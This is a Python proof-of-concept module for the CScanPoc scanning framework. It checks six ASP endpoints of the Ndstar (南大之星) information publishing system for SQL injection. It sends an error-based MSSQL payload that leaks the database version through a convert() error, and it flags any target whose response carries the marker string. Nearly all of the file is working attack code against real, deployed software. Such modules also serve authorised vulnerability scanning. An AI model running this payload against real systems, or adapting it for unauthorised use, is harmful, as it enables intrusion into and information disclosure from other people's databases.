# coding: utf-8

from CScanPoc.thirdparty import requests, hackhttp
from CScanPoc import ABPoc, ABVuln, VulnLevel, VulnType
hh = hackhttp.hackhttp()


class Vuln(ABVuln):
    vuln_id = 'Ndstar_0000'  # 平台漏洞编号，留空
    name = '南大之星信息发布系统SQL注入6枚'  # 漏洞名称
    level = VulnLevel.HIGH  # 漏洞危害级别
    type = VulnType.INJECTION  # 漏洞类型
    disclosure_date = '2016-01-11'  # 漏洞公布时间
    desc = '''
        南大之星档案管理软件，本系统采用浏览器/服务器（B/S）结构，具有维护方便，不需要另外安装客户端软件，客户端只需要一台联网（局域网、校园网、互联网）的计算机就可以了，具有操作简单、维护方便、安全可靠、功能齐全等特点。
        南大之星信息发布系统多处SQL注入漏洞：
        "/pub/search/search_graph_dl.asp?id=85",
        "/pub/search/search_fj_dl.asp?id=2",
        "/pub/search/search_video.asp?id=3",
        "/pub/search/search_audio.asp?id=3",
        "/pub/search/search_audio_view.asp?id=",
        "/pub/search/search_video_view.asp?id=3",
    '''  # 漏洞描述
    ref = 'https://bugs.shuimugan.com/bug/view?bug_no=0153651'  # 漏洞来源
    cnvd_id = 'Unknown'  # cnvd漏洞编号
    cve_id = 'Unknown'  # cve编号
    product = 'Ndstar'  # 漏洞应用名称
    product_version = 'Unknown'  # 漏洞应用版本


class Poc(ABPoc):
    poc_id = '9d747eb7-4aee-4113-a0fc-319e88a5b893'
    author = '国光'  # POC编写者
    create_date = '2018-05-15'  # POC创建时间

    def __init__(self):
        super(Poc, self).__init__(Vuln())
        self.option_schema = {
            'properties': {
                'base_path': {
                    'type': 'string',
                    'description': '部署路径',
                    'default': '',
                    '$default_ref': {
                        'property': 'deploy_path'
                    }
                }
            }
        }

    def verify(self):
        self.target = self.target.rstrip(
            '/') + '/' + (self.get_option('base_path').lstrip('/'))
        try:
            self.output.info('开始对 {target} 进行 {vuln} 的扫描'.format(
                target=self.target, vuln=self.vuln))
            arg = '{target}'.format(target=self.target)
            urls = [
                "/pub/search/search_graph_dl.asp?id=85",
                "/pub/search/search_fj_dl.asp?id=2",
                "/pub/search/search_video.asp?id=3",
                "/pub/search/search_audio.asp?id=3",
                "/pub/search/search_audio_view.asp?id=",
                "/pub/search/search_video_view.asp?id=3",
            ]

            data = "&mid=4%20and%201=convert(int,CHAR(87)%2BCHAR(116)%2BCHAR(70)%2BCHAR(97)%2BCHAR(66)%2BCHAR(99)%2B@@version)-->0--&yh=1"
            for url in urls:
                vul = arg + url + data
                code, head, res, errcode, _ = hh.http(vul)
                if code != 0 and 'WtFaBcMicrosoft' in res:
                    self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(
                        target=self.target, name=self.vuln.name))

        except Exception as e:
            self.output.info('执行异常{}'.format(e))

    def exploit(self):
        self.verify()


if __name__ == '__main__':
    Poc().run()
